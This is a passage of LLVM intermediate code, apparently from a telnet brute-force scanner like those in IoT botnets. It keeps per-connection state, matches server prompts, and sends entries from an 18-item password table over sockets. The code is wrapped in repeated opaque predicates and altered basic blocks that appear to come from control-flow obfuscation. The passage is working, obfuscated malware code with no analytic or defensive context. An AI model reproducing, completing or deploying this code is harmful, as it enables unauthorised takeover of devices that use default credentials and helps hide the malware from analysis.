  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %993

; <label>:972:                                    ; preds = %originalBBpart2108
  %973 = load i32, i32* @x.65
  %974 = load i32, i32* @y.66
  %975 = sub i32 %973, 1
  %976 = mul i32 %973, %975
  %977 = urem i32 %976, 2
  %978 = icmp eq i32 %977, 0
  %979 = icmp slt i32 %974, 10
  %980 = or i1 %978, %979
  br i1 %980, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %972
  %981 = load i32, i32* %10, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 2
  store i8 7, i8* %984, align 8
  %985 = load i32, i32* @x.65
  %986 = load i32, i32* @y.66
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %993

; <label>:993:                                    ; preds = %originalBBpart2116, %originalBBpart2112
  %994 = load i32, i32* %10, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 8
  %998 = load i8*, i8** %997, align 8
  call void @llvm.memset.p0i8.i64(i8* %998, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:999:                                    ; preds = %originalBBpart2104
  %1000 = load i32, i32* %10, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 0
  %1004 = load i32, i32* %1003, align 16
  %1005 = load i32, i32* %10, align 4
  %1006 = sext i32 %1005 to i64
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1006
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1007, i32 0, i32 8
  %1009 = load i8*, i8** %1008, align 8
  %1010 = load i32, i32* %10, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 7
  %1014 = load i16, i16* %1013, align 16
  %1015 = zext i16 %1014 to i32
  %1016 = call i32 @readUntil(i32 %1004, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1009, i32 1024, i32 %1015)
  %1017 = icmp ne i32 %1016, 0
  br i1 %1017, label %1018, label %1066

; <label>:1018:                                   ; preds = %999
  %1019 = load i32, i32* @x.65
  %1020 = load i32, i32* @y.66
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1018
  %1027 = load i32, i32* %10, align 4
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1028
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1029, i32 0, i32 6
  store i32 0, i32* %1030, align 4
  %1031 = load i32, i32* %10, align 4
  %1032 = sext i32 %1031 to i64
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 7
  store i16 0, i16* %1034, align 16
  %1035 = load i32, i32* %10, align 4
  %1036 = sext i32 %1035 to i64
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 8
  %1039 = load i8*, i8** %1038, align 8
  %1040 = call i8* @strstr(i8* %1039, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %1041 = icmp ne i8* %1040, null
  %1042 = load i32, i32* @x.65
  %1043 = load i32, i32* @y.66
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %1041, label %1050, label %1055

; <label>:1050:                                   ; preds = %originalBBpart2120
  %1051 = load i32, i32* %10, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 2
  store i8 5, i8* %1054, align 8
  br label %1060

; <label>:1055:                                   ; preds = %originalBBpart2120
  %1056 = load i32, i32* %10, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 2
  store i8 7, i8* %1059, align 8
  br label %1060

; <label>:1060:                                   ; preds = %1055, %1050
  %1061 = load i32, i32* %10, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 8
  %1065 = load i8*, i8** %1064, align 8
  call void @llvm.memset.p0i8.i64(i8* %1065, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:1066:                                   ; preds = %999
  %1067 = load i32, i32* @x.65
  %1068 = load i32, i32* @y.66
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1066
  %1075 = load i32, i32* %10, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 8
  %1079 = load i8*, i8** %1078, align 8
  %1080 = call i8* @strstr(i8* %1079, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1081 = icmp ne i8* %1080, null
  %1082 = load i32, i32* @x.65
  %1083 = load i32, i32* @y.66
  %1084 = sub i32 %1082, 1
  %1085 = mul i32 %1082, %1084
  %1086 = urem i32 %1085, 2
  %1087 = icmp eq i32 %1086, 0
  %1088 = icmp slt i32 %1083, 10
  %1089 = or i1 %1087, %1088
  br i1 %1089, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1081, label %1090, label %1105

; <label>:1090:                                   ; preds = %originalBBpart2124
  %1091 = load i32, i32* %10, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 16
  %1096 = call i32 @sclose(i32 %1095)
  %1097 = load i32, i32* %10, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 2
  store i8 0, i8* %1100, align 8
  %1101 = load i32, i32* %10, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 3
  store i8 0, i8* %1104, align 1
  br label %2839

; <label>:1105:                                   ; preds = %originalBBpart2124
  %1106 = load i32, i32* %10, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 8
  %1110 = load i8*, i8** %1109, align 8
  %1111 = call i8* @strstr(i8* %1110, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1112 = icmp ne i8* %1111, null
  br i1 %1112, label %1113, label %1128

; <label>:1113:                                   ; preds = %1105
  %1114 = load i32, i32* %10, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 16
  %1119 = call i32 @sclose(i32 %1118)
  %1120 = load i32, i32* %10, align 4
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1121
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1122, i32 0, i32 2
  store i8 0, i8* %1123, align 8
  %1124 = load i32, i32* %10, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1125
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1126, i32 0, i32 3
  store i8 0, i8* %1127, align 1
  br label %2839

; <label>:1128:                                   ; preds = %1105
  %1129 = load i32, i32* %10, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 8
  %1133 = load i8*, i8** %1132, align 8
  %1134 = call i8* @strstr(i8* %1133, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1135 = icmp ne i8* %1134, null
  br i1 %1135, label %1136, label %1151

; <label>:1136:                                   ; preds = %1128
  %1137 = load i32, i32* %10, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 0
  %1141 = load i32, i32* %1140, align 16
  %1142 = call i32 @sclose(i32 %1141)
  %1143 = load i32, i32* %10, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1144
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1145, i32 0, i32 2
  store i8 0, i8* %1146, align 8
  %1147 = load i32, i32* %10, align 4
  %1148 = sext i32 %1147 to i64
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1148
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1149, i32 0, i32 3
  store i8 0, i8* %1150, align 1
  br label %2839

; <label>:1151:                                   ; preds = %1128
  %1152 = load i32, i32* %10, align 4
  %1153 = sext i32 %1152 to i64
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1153
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1154, i32 0, i32 8
  %1156 = load i8*, i8** %1155, align 8
  %1157 = call i8* @strstr(i8* %1156, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1158 = icmp ne i8* %1157, null
  br i1 %1158, label %1159, label %1174

; <label>:1159:                                   ; preds = %1151
  %1160 = load i32, i32* %10, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1161
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1162, i32 0, i32 0
  %1164 = load i32, i32* %1163, align 16
  %1165 = call i32 @sclose(i32 %1164)
  %1166 = load i32, i32* %10, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 2
  store i8 0, i8* %1169, align 8
  %1170 = load i32, i32* %10, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 3
  store i8 0, i8* %1173, align 1
  br label %2839

; <label>:1174:                                   ; preds = %1151
  %1175 = load i32, i32* %10, align 4
  %1176 = sext i32 %1175 to i64
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1176
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1177, i32 0, i32 8
  %1179 = load i8*, i8** %1178, align 8
  %1180 = call i8* @strstr(i8* %1179, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1181 = icmp ne i8* %1180, null
  br i1 %1181, label %1182, label %1197

; <label>:1182:                                   ; preds = %1174
  %1183 = load i32, i32* %10, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 0
  %1187 = load i32, i32* %1186, align 16
  %1188 = call i32 @sclose(i32 %1187)
  %1189 = load i32, i32* %10, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 2
  store i8 0, i8* %1192, align 8
  %1193 = load i32, i32* %10, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 3
  store i8 0, i8* %1196, align 1
  br label %2839

; <label>:1197:                                   ; preds = %1174
  %1198 = load i32, i32* %10, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 8
  %1202 = load i8*, i8** %1201, align 8
  %1203 = call i8* @strstr(i8* %1202, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1204 = icmp ne i8* %1203, null
  br i1 %1204, label %1205, label %1236

; <label>:1205:                                   ; preds = %1197
  %1206 = load i32, i32* @x.65
  %1207 = load i32, i32* @y.66
  %1208 = sub i32 %1206, 1
  %1209 = mul i32 %1206, %1208
  %1210 = urem i32 %1209, 2
  %1211 = icmp eq i32 %1210, 0
  %1212 = icmp slt i32 %1207, 10
  %1213 = or i1 %1211, %1212
  br i1 %1213, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1205
  %1214 = load i32, i32* %10, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 0
  %1218 = load i32, i32* %1217, align 16
  %1219 = call i32 @sclose(i32 %1218)
  %1220 = load i32, i32* %10, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 2
  store i8 0, i8* %1223, align 8
  %1224 = load i32, i32* %10, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 3
  store i8 0, i8* %1227, align 1
  %1228 = load i32, i32* @x.65
  %1229 = load i32, i32* @y.66
  %1230 = sub i32 %1228, 1
  %1231 = mul i32 %1228, %1230
  %1232 = urem i32 %1231, 2
  %1233 = icmp eq i32 %1232, 0
  %1234 = icmp slt i32 %1229, 10
  %1235 = or i1 %1233, %1234
  br i1 %1235, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %2839

; <label>:1236:                                   ; preds = %1197
  %1237 = load i32, i32* @x.65
  %1238 = load i32, i32* @y.66
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1236
  %1245 = load i32, i32* %10, align 4
  %1246 = sext i32 %1245 to i64
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 8
  %1249 = load i8*, i8** %1248, align 8
  %1250 = call i8* @strstr(i8* %1249, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1251 = icmp ne i8* %1250, null
  %1252 = load i32, i32* @x.65
  %1253 = load i32, i32* @y.66
  %1254 = sub i32 %1252, 1
  %1255 = mul i32 %1252, %1254
  %1256 = urem i32 %1255, 2
  %1257 = icmp eq i32 %1256, 0
  %1258 = icmp slt i32 %1253, 10
  %1259 = or i1 %1257, %1258
  br i1 %1259, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1251, label %1260, label %1291

; <label>:1260:                                   ; preds = %originalBBpart2132
  %1261 = load i32, i32* @x.65
  %1262 = load i32, i32* @y.66
  %1263 = sub i32 %1261, 1
  %1264 = mul i32 %1261, %1263
  %1265 = urem i32 %1264, 2
  %1266 = icmp eq i32 %1265, 0
  %1267 = icmp slt i32 %1262, 10
  %1268 = or i1 %1266, %1267
  br i1 %1268, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1260
  %1269 = load i32, i32* %10, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1270
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1271, i32 0, i32 0
  %1273 = load i32, i32* %1272, align 16
  %1274 = call i32 @sclose(i32 %1273)
  %1275 = load i32, i32* %10, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 2
  store i8 0, i8* %1278, align 8
  %1279 = load i32, i32* %10, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 3
  store i8 0, i8* %1282, align 1
  %1283 = load i32, i32* @x.65
  %1284 = load i32, i32* @y.66
  %1285 = sub i32 %1283, 1
  %1286 = mul i32 %1283, %1285
  %1287 = urem i32 %1286, 2
  %1288 = icmp eq i32 %1287, 0
  %1289 = icmp slt i32 %1284, 10
  %1290 = or i1 %1288, %1289
  br i1 %1290, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %2839

; <label>:1291:                                   ; preds = %originalBBpart2132
  %1292 = load i32, i32* %10, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1293
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1294, i32 0, i32 8
  %1296 = load i8*, i8** %1295, align 8
  %1297 = call i8* @strstr(i8* %1296, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1298 = icmp ne i8* %1297, null
  br i1 %1298, label %1299, label %1314

; <label>:1299:                                   ; preds = %1291
  %1300 = load i32, i32* %10, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 0
  %1304 = load i32, i32* %1303, align 16
  %1305 = call i32 @sclose(i32 %1304)
  %1306 = load i32, i32* %10, align 4
  %1307 = sext i32 %1306 to i64
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1307
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1308, i32 0, i32 2
  store i8 0, i8* %1309, align 8
  %1310 = load i32, i32* %10, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 3
  store i8 0, i8* %1313, align 1
  br label %2839

; <label>:1314:                                   ; preds = %1291
  %1315 = load i32, i32* @x.65
  %1316 = load i32, i32* @y.66
  %1317 = sub i32 %1315, 1
  %1318 = mul i32 %1315, %1317
  %1319 = urem i32 %1318, 2
  %1320 = icmp eq i32 %1319, 0
  %1321 = icmp slt i32 %1316, 10
  %1322 = or i1 %1320, %1321
  br i1 %1322, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1314
  %1323 = load i32, i32* @x.65
  %1324 = load i32, i32* @y.66
  %1325 = sub i32 %1323, 1
  %1326 = mul i32 %1323, %1325
  %1327 = urem i32 %1326, 2
  %1328 = icmp eq i32 %1327, 0
  %1329 = icmp slt i32 %1324, 10
  %1330 = or i1 %1328, %1329
  br i1 %1330, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1331

; <label>:1331:                                   ; preds = %originalBBpart2140
  br label %1332

; <label>:1332:                                   ; preds = %1331
  br label %1333

; <label>:1333:                                   ; preds = %1332
  br label %1334

; <label>:1334:                                   ; preds = %1333
  %1335 = load i32, i32* @x.65
  %1336 = load i32, i32* @y.66
  %1337 = sub i32 %1335, 1
  %1338 = mul i32 %1335, %1337
  %1339 = urem i32 %1338, 2
  %1340 = icmp eq i32 %1339, 0
  %1341 = icmp slt i32 %1336, 10
  %1342 = or i1 %1340, %1341
  br i1 %1342, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1334
  %1343 = load i32, i32* @x.65
  %1344 = load i32, i32* @y.66
  %1345 = sub i32 %1343, 1
  %1346 = mul i32 %1343, %1345
  %1347 = urem i32 %1346, 2
  %1348 = icmp eq i32 %1347, 0
  %1349 = icmp slt i32 %1344, 10
  %1350 = or i1 %1348, %1349
  br i1 %1350, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1351

; <label>:1351:                                   ; preds = %originalBBpart2144
  br label %1352

; <label>:1352:                                   ; preds = %1351
  br label %1353

; <label>:1353:                                   ; preds = %1352
  %1354 = load i32, i32* %10, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 8
  %1358 = load i8*, i8** %1357, align 8
  %1359 = call i64 @strlen(i8* %1358) #10
  %1360 = trunc i64 %1359 to i16
  %1361 = load i32, i32* %10, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 7
  store i16 %1360, i16* %1364, align 16
  br label %1365

; <label>:1365:                                   ; preds = %1353
  br label %1366

; <label>:1366:                                   ; preds = %1365
  %1367 = load i32, i32* %10, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 6
  %1371 = load i32, i32* %1370, align 4
  %1372 = add i32 %1371, 10
  %1373 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1374 = icmp ult i32 %1372, %1373
  br i1 %1374, label %1375, label %1390

; <label>:1375:                                   ; preds = %1366
  %1376 = load i32, i32* %10, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1377
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1378, i32 0, i32 0
  %1380 = load i32, i32* %1379, align 16
  %1381 = call i32 @sclose(i32 %1380)
  %1382 = load i32, i32* %10, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 2
  store i8 0, i8* %1385, align 8
  %1386 = load i32, i32* %10, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1387
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1388, i32 0, i32 3
  store i8 1, i8* %1389, align 1
  br label %1390

; <label>:1390:                                   ; preds = %1375, %1366
  br label %2838

; <label>:1391:                                   ; preds = %116
  %1392 = load i32, i32* @x.65
  %1393 = load i32, i32* @y.66
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1391
  %1400 = load i32, i32* %10, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1401
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1402, i32 0, i32 0
  %1404 = load i32, i32* %1403, align 16
  %1405 = load i32, i32* %10, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1406
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1407, i32 0, i32 5
  %1409 = load i8, i8* %1408, align 1
  %1410 = zext i8 %1409 to i64
  %1411 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1410
  %1412 = load i8*, i8** %1411, align 8
  %1413 = load i32, i32* %10, align 4
  %1414 = sext i32 %1413 to i64
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1415, i32 0, i32 5
  %1417 = load i8, i8* %1416, align 1
  %1418 = zext i8 %1417 to i64
  %1419 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1418
  %1420 = load i8*, i8** %1419, align 8
  %1421 = call i64 @strlen(i8* %1420) #10
  %1422 = call i64 @send(i32 %1404, i8* %1412, i64 %1421, i32 16384)
  %1423 = icmp slt i64 %1422, 0
  %1424 = load i32, i32* @x.65
  %1425 = load i32, i32* @y.66
  %1426 = sub i32 %1424, 1
  %1427 = mul i32 %1424, %1426
  %1428 = urem i32 %1427, 2
  %1429 = icmp eq i32 %1428, 0
  %1430 = icmp slt i32 %1425, 10
  %1431 = or i1 %1429, %1430
  br i1 %1431, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1423, label %1432, label %1447

; <label>:1432:                                   ; preds = %originalBBpart2148
  %1433 = load i32, i32* %10, align 4
  %1434 = sext i32 %1433 to i64
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1434
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1435, i32 0, i32 0
  %1437 = load i32, i32* %1436, align 16
  %1438 = call i32 @sclose(i32 %1437)
  %1439 = load i32, i32* %10, align 4
  %1440 = sext i32 %1439 to i64
  %1441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1440
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1441, i32 0, i32 2
  store i8 0, i8* %1442, align 8
  %1443 = load i32, i32* %10, align 4
